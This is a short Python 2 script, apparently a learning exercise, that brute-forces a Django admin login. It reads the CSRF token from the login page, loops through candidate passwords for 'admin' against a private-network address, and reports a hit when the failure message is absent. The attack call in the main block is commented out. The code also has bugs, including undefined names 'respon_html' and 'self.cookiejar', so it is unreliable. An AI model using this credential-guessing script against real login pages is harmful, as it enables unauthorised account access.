#!/usr/bin/python
#coding=utf-8
#filename:learn_py.py

import urllib, urllib2, cookielib, time
from os import path
class auth_cookie():
    def __init__(self,
                 user_agent="Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
                 cookie_file="/tmp/cookie_test.txt"):
        self.client_headers = {'User-Agent': user_agent}
        self.ckjar = cookielib.MozillaCookieJar(cookie_file)
        self.ckprc = urllib2.HTTPCookieProcessor(self.ckjar)
        self.opener = urllib2.build_opener(self.ckprc)

    def pre_read(self,
                 url="http://192.168.192.214:8000/admin/"):
        #在GET/POST访问登录界面时，会生成CSRF信息，在提交时的FORM中需要对应信息
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "urllib2.urlopen() raise ERROR(", e, ")"
            return
        self.response = response.read()
        tmp = self.response.find("csrfmiddlewaretoken")
        csrf = self.response[tmp:tmp+60]
        self.csrfM = csrf.split("'")[2]
        return

    def crack(self,
              username="admin",
              url="http://192.168.192.214:8000/admin/",
              csrfM=None,
              pwd="test"):
        for key1 in pwd:
            pwd_encode = urllib.urlencode({
                    'username': username,
                    'password': key1,
                    'this_is_the_login_form': 1,
                    'next': '/admin/',
                    'csrfmiddlewaretoken': csrfM
                    })
            try:
                req = urllib2.Request(url, self.client_headers)
                response = self.opener.open(req, pwd_encode)
            except urllib2.HTTPError, e:
                print "opener.open() raise ERROR(", e, ")"
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = respon_html.find('Please enter the correct')
                if case != -1:
                    #print "false.....", key1
                    pass
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return "good luck"
        return "error"

    def print_class(self):
        print self.client_headers
        print self.ckjar.filename

if __name__ == "__main__":
    s11 = auth_cookie()
    s11.print_class()
    # s11.pre_read()
    # pwd = ['admin']
    # s11.crack(pwd=pwd, csrfM=s11.csrfM)
    ROOT_PATH = path.abspath(path.join(path.dirname('learn_py.py'), path.pardir))
    print ROOT_PATH
    import os
    print os.path.join(os.path.dirname(__file__), 'abcdefg')
